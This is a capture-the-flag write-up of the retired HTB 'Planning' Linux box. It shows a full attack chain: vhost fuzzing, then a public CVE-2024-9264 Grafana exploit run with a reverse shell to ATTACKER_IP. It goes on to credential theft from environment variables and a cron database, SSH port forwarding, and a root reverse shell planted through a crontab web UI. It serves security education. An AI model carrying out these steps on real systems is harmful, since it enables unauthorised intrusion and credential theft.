---
title: "📊🕒 HTB Planning Write-up"
name: Planning
date: 2025-09-14
difficulty: Easy
os: Linux
skills: "Enumeration, Web Fuzzing, Reverse Shell, Credential Hunting, Password Reuse, SSH Local Port Forwarding, Privilege Escalation"
tools: "rustscan, nmap, ffuf, CVE-2024-9264, nc, ssh, revshells" 
published: true
---

![](images/Pasted%20image%2020250705153502.png)

```
Machine Information

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
```

## 🗂️ Summary

In this box, I infiltrate an education-themed platform where outdated software and misconfigurations give way to total system compromise. 

I start with access to a hidden **Grafana dashboard** vulnerable to **CVE-2024-9264**, which grants a root shell—but only within a Docker container. 
From there, I pivot using **leaked credentials from environment variables**, SSH into the host, and uncover a **cron job management UI** quietly running on localhost. 

With a second leaked password in hand, I schedule my own **reverse shell via the crontab UI**, finally gaining root access.  🕒💥

## 📊 Grafana website

### 🔎 Recon 

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 9.6
- `80/tcp`: nginx 1.24.0

```
fcoomans@kali:~/htb/planning$ rustscan -a 10.10.11.68 --tries 5 --ulimit 10000 -- -sCV -oA planning_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.68:22
Open 10.10.11.68:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA planning_tcp_all" on ip 10.10.11.68
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for planning.htb (10.10.11.68)
Host is up, received reset ttl 63 (0.18s latency).
Scanned at 2025-07-05 15:36:18 SAST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `planning.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/planning$ grep planning.htb /etc/hosts
10.10.11.68     planning.htb
```

I fuzz for virtual hosts and get a hit...

```
fcoomans@kali:~/htb/planning$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://planning.htb -H "Host: FUZZ.planning.htb" -ic -t 60 -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 178ms]
:: Progress: [151265/151265] :: Job [1/1] :: 327 req/sec :: Duration: [0:07:51] :: Errors: 0 ::
```

`/etc/hosts` is updated with the new subdomain.

```
fcoomans@kali:~/htb/planning$ grep planning.htb /etc/hosts
10.10.11.68     planning.htb grafana.planning.htb
```

I then log in to http://grafana.planning.htb with the supplied credentials and find that the server is running Grafana v11.0 (83b9528bce).

![](images/Pasted%20image%2020250705153903.png)

#### 🐞 CVE-2024-9264

A quick Google search for `grafana v11.0.0 (83b9528bce) exploit` leads to **CVE-2024-9264**, a known **Remote Command Execution (RCE)** vulnerability.

A proof of concept for the CVE is found at https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit, and the repo is cloned.

```
fcoomans@kali:~/htb/planning$ git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git
Cloning into 'CVE-2024-9264-RCE-Exploit'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 15 (delta 6), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (15/15), 5.73 KiB | 1.91 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

### 🧪 Exploitation

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/planning$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And the exploit is executed.

```
fcoomans@kali:~/htb/planning/CVE-2024-9264-RCE-Exploit$ python poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip ATTACKER_IP --reverse-port 4444
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 4444
```

The `nc` listener catches the reverse shell.

```
fcoomans@kali:~/htb/planning$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.68] 51282
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

From the container shell, I dump the environment variables and uncover hardcoded Grafana credentials for user `enzo`.

```
# env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=/usr/bin/sh
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```

#### 👣 Foothold as enzo

This lets me pivot to the host system via SSH using `enzo` and password `RioTecRANDEntANT!`

```
fcoomans@kali:~/htb/planning$ ssh enzo@planning.htb
enzo@planning.htb's password:

<SNIP>

enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
enzo@planning:~$ hostname
planning
```

### 💰 Post Exploitation

#### 🚩 user.txt

Enzo holds the `user.txt` flag.

```
enzo@planning:~$ cat user.txt
d066965113447dd5b9d09f2c93275f1e
```

## 🕒 Time to get root access

### 🔎 Recon 

linPEAS shows that something is running on localhost port 8000 and that there are unusual directories under `/opt`.

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:34319         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:8000                :::*                    LISTEN      321069/ssh

<SNIP>

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 root root 4096 Feb 28 19:21 .
drwxr-xr-x 22 root root 4096 Apr  3 14:40 ..
drwx--x--x  4 root root 4096 Feb 28 19:06 containerd
drwxr-xr-x  2 root root 4096 Jul  5 13:02 crontabs
```

This `/opt/crontabs/crontab.db` file stores scheduled tasks **including hardcoded passwords** (`P4ssw0rdS0pRi0T3c`), making it a serious security oversight.

```
enzo@planning:/opt/crontabs$ cat crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Using SSH port forwarding:

```
fcoomans@kali:~/htb/planning$ ssh -L 127.0.0.1:8000:127.0.0.1:8000 enzo@planning.htb
enzo@planning.htb's password:
```

I log in to http://localhost:8000 with user `root` and password `P4ssw0rdS0pRi0T3c`.
This site is a Crontab UI for visually adding scheduled tasks.

![](images/Pasted%20image%2020250705154228.png)

### 🧪 Exploitation

https://www.revshells.com is used to generate a `nc mkfifo` reverse shell payload.

![](images/Pasted%20image%2020250705154301.png)

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/planning$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

I add the reverse shell payload as a new cron job using the web UI.

![](images/Pasted%20image%2020250705154548.png)

The new `Revshell` cronjob is run.

![](images/Pasted%20image%2020250705154629.png)

#### 🔼 Root

And the `nc` listener catches the rooted reverse shell.

```
fcoomans@kali:~/htb/planning$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.68] 39408
bash: cannot set terminal process group (1348): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@planning:/# hostname
hostname
planning
```

### 💰 Post Exploitation

#### 🏆 root.txt flag

`root` is the holder of the `root.txt` flag.

```
root@planning:~# cat root.txt
cat root.txt
772c1073903980967b42b3e22681d3c1
```

When you don’t plan for security, someone else will. This time, that someone was me. 🎯

And `Planning has been Pwned!` 🎉

![](images/Pasted%20image%2020250705154917.png)

## 📚 Lessons Learned

- **Keep software updated**: Running outdated services like Grafana v11.0 made the initial foothold trivial via a public exploit. Regular patching is essential, especially for internet-facing applications.
- **Lock down sensitive files**: Weak file permissions on `crontab.db` exposed credentials in plaintext. Always apply the principle of least privilege and avoid storing secrets in easily accessible locations.
- **Don’t trust localhost blindly**: The cron job management UI was only accessible on `127.0.0.1`, yet it accepted root credentials and allowed full command execution. Internal services should still require strong authentication and minimal privileges — or be isolated entirely.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
